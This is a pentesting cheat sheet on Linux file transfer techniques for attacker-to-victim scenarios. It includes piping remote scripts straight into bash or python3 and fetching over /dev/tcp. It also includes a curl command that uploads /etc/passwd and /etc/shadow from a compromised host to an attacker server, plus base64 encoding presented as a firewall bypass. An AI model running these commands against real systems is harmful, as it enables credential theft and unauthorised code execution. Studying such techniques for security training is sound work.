---
title: Transferring files techniques - Linux
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - linux
  - exploitation
  - file transfer technique
  - backdoors
---

# Transferring files techniques  - Linux

## Replicating client-server 

### Setting up a server in the attacking machine 

#### Apache server

Once you have a folder structure such as "/var/www/" or "/var/www/html", and also an Apache server installed, you can serve all files from that path by initiating the service:

```bash
service apache2 start
```


#### Simple python server

```shell-session
# Creating a Web Server with Python3
cd /tmp
python3 -m http.server 8000

# Creating a Web Server with Python2.7
python2.7 -m SimpleHTTPServer
```


#### Creating a Web Server with PHP

```shell-session
php -S 0.0.0.0:8000
```


#### Creating a Web Server with Ruby

```shell-session
ruby -run -ehttpd . -p8000
```


### Download files from victim's machine

#### wget

```shell-session
wget http://<SERVERIP>:<SERVERPORT>/<file>
```

#### curl

```shell-session
curl http://http://<SERVERIP>:<SERVERPORT>/<file> -o <OutputNameForFile>
```


### Fileless downloads using Linux

Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

#### Fileless Download with cURL

```shell-session
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```


#### Fileless Download with wget

```shell-session
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## Bash downloads

On the server side (attacking machine), setup a server by using one of the methodologies applied above.

On the client side (victim's machine):

```shell-session
# Connecting to the Target Webserver (attacking machine serving the file)
exec 3<>/dev/tcp/$ip/80

# Requesting the file to the server 
echo -e "GET /file.sh HTTP/1.1\n\n">&3

# Printing the Response
cat <&3
```


## SSH downloads and uploads: SCP

SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol. 

Two requirements:

 - we have ssh user credentials on the remote host
 - ssh is open on port 22

On the server's side (attacker's machine):

```shell-session
# Enable the service
sudo systemctl enable ssh

# Start the server
sudo systemctl start ssh

# Check if port is listening
netstat -lnpt
```

From the attacker machine too:

```
# Download file foobar.txt saved in the victim's machin. Command is run from attacker machine connecting to the remote host (victim's machine)
scp username@$IPvictim:foobar.txt /some/local/directory

# Upload file foo.txt saved in attacker machine into the victim's. Command is run from attacker machine connecting to the remote host (victim's machine)
scp foo.txt username@$IPvictim:/some/remote/directory
```



## Base64

To avoid firewall protections we can:

**1.** Base64 encode the file:

```shell-session
base64 file.php -w 0

# Alternative
cat file |base64 -w 0;echo

```

**2.** Copy the base64 string, go to the remote host and decode it and pipe to a file:

```shell-session
echo -n "Looooooong-string-encoded-in-base64" | base64 -d > file.php
# -n: do not output the trailing newline
```

## Web upload

We can use [uploadserver](uploadserver).


```bash
# Install
python3 -m pip install --user uploadserver

# As we will use https, we will create a self-signed certificate. This file should be hosted in a different location from the web server folder
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Start the web server
python3 -m uploadserver 443 --server-certificate /location/different/folder/server.pem

# Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.
curl -X POST https://$attackerIP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
# We used the option --insecure because we used a self-signed certificate that we trust.
```


 ## Backdoors

See [reverse shells](reverse-shells.md), [bind shells](bind-shells.md), and [web shells](web-shells.md).

